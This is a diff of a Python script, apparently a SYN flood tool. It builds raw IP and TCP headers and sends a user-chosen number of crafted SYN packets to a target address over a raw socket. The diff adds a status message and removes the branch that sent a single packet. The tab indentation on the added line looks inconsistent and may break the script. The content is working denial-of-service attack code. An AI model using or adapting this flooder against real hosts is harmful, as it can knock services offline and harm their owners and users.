@@ -99,16 +99,13 @@ def main():
         tcp_header = syn_flood.tcpCreate(args.sip, args.dip, args.sport, args.dport)
         packet = ip_header + tcp_header
         if args.flood:
+		print("Flood option selected: Sending packets...")
                 i = 0
                 value = int(args.flood)
                 while i < value:
                         i += 1
                         print("Packets sent: {}".format(i))
                         result = s.sendto(packet, (args.dip, 0))
-        else:
-                print("Flood option was not chosen, sending 1 SYN packet...")
-                result = s.sendto(packet, (args.dip, 0))
-
 #	progCheck()
 #	ip = (str(sys.argv[1]))
 #	port = int((sys.argv[2]))
